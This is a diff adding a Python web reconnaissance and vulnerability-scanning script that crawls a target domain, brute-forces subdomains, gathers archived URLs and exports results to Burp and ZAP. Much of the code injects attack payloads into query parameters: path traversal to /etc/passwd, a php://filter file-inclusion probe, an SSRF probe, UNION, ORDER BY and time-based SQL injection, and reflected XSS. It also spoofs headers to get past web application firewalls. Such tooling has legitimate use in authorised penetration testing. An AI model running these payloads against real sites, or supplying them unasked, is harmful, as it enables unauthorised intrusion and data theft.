@@ -1,0 +1,313 @@
+#!/usr/bin/env python3
+# recon_crawler_pro.py
+
+import argparse
+import requests
+import threading
+import time
+import re
+import os
+import subprocess
+from urllib.parse import urlparse, urljoin, parse_qs
+from bs4 import BeautifulSoup
+from queue import Queue
+import random
+import shutil
+import json
+
+visited = set()
+lock = threading.Lock()
+q = Queue()
+history_urls = set()
+
+# Output directory
+output_dir = "output"
+os.makedirs(output_dir, exist_ok=True)
+
+# Output Files
+visited_file = os.path.join(output_dir, "visited.txt")
+crawled_urls = os.path.join(output_dir, "urls.txt")
+live_subs = os.path.join(output_dir, "live_subdomains.txt")
+js_urls = os.path.join(output_dir, "js_urls.txt")
+burp_out = os.path.join(output_dir, "burp_export.xml")
+zap_out = os.path.join(output_dir, "zap_export.txt")
+sqli_out = os.path.join(output_dir, "sqli.txt")
+xss_out = os.path.join(output_dir, "xss.txt")
+wayback_out = os.path.join(output_dir, "waybackurls.txt")
+
+# User-agents & WAF Bypass Headers
+user_agents = [
+    "Mozilla/5.0", "curl/7.68.0", "Wget/1.20.3", "Googlebot/2.1"
+]
+
+def waf_headers():
+    return {
+        "User-Agent": random.choice(user_agents),
+        "X-Forwarded-For": f"127.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+    }
+
+def save_file(path, content):
+    with open(path, 'a') as f:
+        f.write(content + '\n')
+
+def load_visited():
+    if os.path.exists(visited_file):
+        with open(visited_file, 'r') as f:
+            for line in f:
+                visited.add(line.strip())
+
+def extract_links(base, html):
+    soup = BeautifulSoup(html, "html.parser")
+    links = [urljoin(base, tag['href']) for tag in soup.find_all("a", href=True)]
+    return links
+
+def extract_js_links(base, html):
+    soup = BeautifulSoup(html, "html.parser")
+    results = []
+    for tag in soup.find_all("script"):
+        if tag.get("src"):
+            results.append(urljoin(base, tag["src"]))
+        elif tag.string:
+            results += re.findall(r'"(http[s]?://[^\"]+)",?', tag.string)
+    return results
+
+def detect_lfi_ssrf_pathtraversal(url):
+    parsed = urlparse(url)
+    if parsed.query:
+        params = parse_qs(parsed.query)
+        for param in params:
+            for payload, keyword in [
+                ("../../../../etc/passwd", "root:x:"),
+                ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),
+                ("http://127.0.0.1", "localhost")
+            ]:
+                test_url = re.sub(f"{param}=[^&]*", f"{param}={payload}", url)
+                try:
+                    r = requests.get(test_url, headers=waf_headers(), timeout=8)
+                    if keyword.lower() in r.text.lower():
+                        print(f"[!] Potential vuln at: {test_url}")
+                        save_file(os.path.join(output_dir, "vulns.txt"), f"{test_url} => {keyword}")
+                except: continue
+
+def detect_sqli_union(url):
+    if "=" not in url: return
+    test_url = url + "' UNION SELECT NULL--"
+    try:
+        r = requests.get(test_url, headers=waf_headers(), timeout=8)
+        if "NULL" in r.text or r.status_code == 500:
+            print(f"[!] Possible SQLi (UNION) at: {test_url}")
+            save_file(sqli_out, test_url)
+    except: pass
+
+def detect_sqli_blind(url):
+    if "=" not in url: return
+    parsed = urlparse(url)
+    for param in parse_qs(parsed.query):
+        test_url = re.sub(f"{param}=[^&]*", f"{param}=1' AND SLEEP(5)-- ", url)
+        try:
+            start = time.time()
+            requests.get(test_url, headers=waf_headers(), timeout=8)
+            if time.time() - start > 5:
+                print(f"[!] Possible Blind SQLi at: {test_url}")
+                save_file(sqli_out, test_url)
+        except: pass
+
+def detect_sqli_auto(url):
+    parsed = urlparse(url)
+    if not parsed.query:
+        return
+
+    params = parse_qs(parsed.query)
+    for param in params:
+        print(f"[*] Testing SQLi: {url} (param: {param})")
+        for i in range(1, 10):
+            test_url = re.sub(f"{param}=[^&]*", f"{param}=' ORDER BY {i}--", url)
+            try:
+                r = requests.get(test_url, headers=waf_headers(), timeout=8)
+                if "Unknown column" in r.text or "order clause" in r.text:
+                    print(f"[!] SQLi ORDER BY columns found: {i-1} ({test_url})")
+                    col_count = i - 1
+                    break
+            except: continue
+        else:
+            col_count = 3
+
+        payload = ",".join([f"'q{i}'" for i in range(1, col_count + 1)])
+        union_url = re.sub(f"{param}=[^&]*", f"{param}=' UNION SELECT {payload}--", url)
+        try:
+            r = requests.get(union_url, headers=waf_headers(), timeout=8)
+            if any(f"q{i}" in r.text for i in range(1, col_count + 1)):
+                print(f"[✓] UNION SQLi detected at: {union_url}")
+                save_file(os.path.join(output_dir, "vulns.txt"), f"SQLi => {union_url}")
+        except: continue
+
+def detect_xss(url):
+    if "=" not in url: return
+    payload = "<script>alert(1)</script>"
+    parsed = urlparse(url)
+    for param in parse_qs(parsed.query):
+        test_url = re.sub(f"{param}=[^&]*", f"{param}={payload}", url)
+        try:
+            r = requests.get(test_url, headers=waf_headers(), timeout=6)
+            if payload in r.text:
+                print(f"[!] Reflected XSS at: {test_url}")
+                save_file(xss_out, test_url)
+        except: pass
+
+def extract_json_params(body):
+    try:
+        data = json.loads(body)
+        if isinstance(data, dict):
+            return list(data.keys())
+    except: pass
+    return []
+
+def crawl(base, domain, delay, js_parser, vuln_scan, filter_key, xss, sqli, json_mode, follow_redirect):
+    while not q.empty():
+        url = q.get()
+        with lock:
+            if url in visited:
+                q.task_done()
+                continue
+            visited.add(url)
+            save_file(visited_file, url)
+
+        try:
+            r = requests.get(url, headers=waf_headers(), timeout=10, allow_redirects=follow_redirect)
+            if 300 <= r.status_code < 400:
+                location = r.headers.get("Location")
+                print(f"[↪] Redirect found: {url} → {location}")
+                if location:
+                    redirect_url = urljoin(url, location)
+                    if domain in redirect_url and redirect_url not in visited:
+                        q.put(redirect_url)
+
+            if filter_key in url:
+                save_file(crawled_urls, url)
+                print(f"[+] {url}")
+
+            links = extract_links(url, r.text)
+            for l in links:
+                if domain in l and l not in visited:
+                    q.put(l)
+
+            if js_parser:
+                js_links = extract_js_links(url, r.text)
+                for js in js_links:
+                    save_file(js_urls, js)
+
+            if vuln_scan:
+                detect_lfi_ssrf_pathtraversal(url)
+                detect_sqli_auto(url)
+            if sqli:
+                detect_sqli_union(url)
+                detect_sqli_blind(url)
+            if xss:
+                detect_xss(url)
+            if json_mode:
+                json_keys = extract_json_params(r.text)
+                if json_keys:
+                    print(f"[i] JSON Keys in {url}: {json_keys}")
+                    save_file(os.path.join(output_dir, "json_fields.txt"), f"{url} => {json_keys}")
+
+            time.sleep(delay)
+        except: pass
+        finally:
+            q.task_done()
+
+def sub_brute(domain, wordlist):
+    if not os.path.exists(wordlist): return
+    with open(wordlist) as f:
+        for sub in f:
+            url = f"https://{sub.strip()}.{domain}"
+            try:
+                r = requests.get(url, headers=waf_headers(), timeout=4)
+                if r.status_code < 400:
+                    print(f"[+] Live subdomain: {url}")
+                    save_file(live_subs, url)
+            except: continue
+
+def gather_gau(domain):
+    print("[*] Running gau...")
+    if not shutil.which("gau"):
+        print("[-] gau binary not found in PATH. Please install it: go install github.com/lc/gau/v2/cmd/gau@latest")
+        return
+    try:
+        output = subprocess.check_output(["gau", domain], stderr=subprocess.STDOUT).decode()
+        for line in output.splitlines():
+            line = line.strip()
+            if not line.startswith("http"):
+                continue
+            history_urls.add(line)
+            q.put(line)
+            save_file(wayback_out, line)
+    except subprocess.CalledProcessError as e:
+        print("[-] gau error:")
+        print(e.output.decode())
+    except Exception as e:
+        print(f"[-] gau failed: {e}")
+
+def export_to_burp():
+    with open(burp_out, 'w') as f:
+        f.write("<items>\n")
+        for url in visited:
+            f.write(f"<item><url>{url}</url></item>\n")
+        f.write("</items>")
+    print(f"[✓] Exported to {burp_out}")
+
+def export_to_zap():
+    with open(zap_out, 'w') as f:
+        for url in visited:
+            f.write(url + "\n")
+    print(f"[✓] Exported to {zap_out}")
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--url', required=True)
+    parser.add_argument('--threads', type=int, default=10)
+    parser.add_argument('--delay', type=float, default=0.5)
+    parser.add_argument('--resume', action='store_true')
+    parser.add_argument('--js-parser', action='store_true')
+    parser.add_argument('--vuln-scan', action='store_true')
+    parser.add_argument('--filter', default="")
+    parser.add_argument('--subdomains', help='Path to wordlist')
+    parser.add_argument('--gau', action='store_true')
+    parser.add_argument('--export-burp', action='store_true')
+    parser.add_argument('--export-zap', action='store_true')
+    parser.add_argument('--xssscan', action='store_true')
+    parser.add_argument('--sqlscan', action='store_true')
+    parser.add_argument('--json-mode', action='store_true')
+    parser.add_argument('--follow-redirect', action='store_true')
+    args = parser.parse_args()
+
+    domain = urlparse(args.url).netloc
+
+    if args.resume:
+        load_visited()
+    else:
+        open(visited_file, 'w').close()
+
+    if args.subdomains:
+        sub_brute(domain, args.subdomains)
+
+    if args.gau:
+        gather_gau(domain)
+
+    q.put(args.url)
+
+    for _ in range(args.threads):
+        t = threading.Thread(target=crawl, args=(args.url, domain, args.delay, args.js_parser, args.vuln_scan, args.filter, args.xssscan, args.sqlscan, args.json_mode, args.follow_redirect))
+        t.daemon = True
+        t.start()
+
+    q.join()
+
+    if args.export_burp:
+        export_to_burp()
+    if args.export_zap:
+        export_to_zap()
+
+    print("[✓] Scan completed!")
+
+if __name__ == '__main__':
+    main()
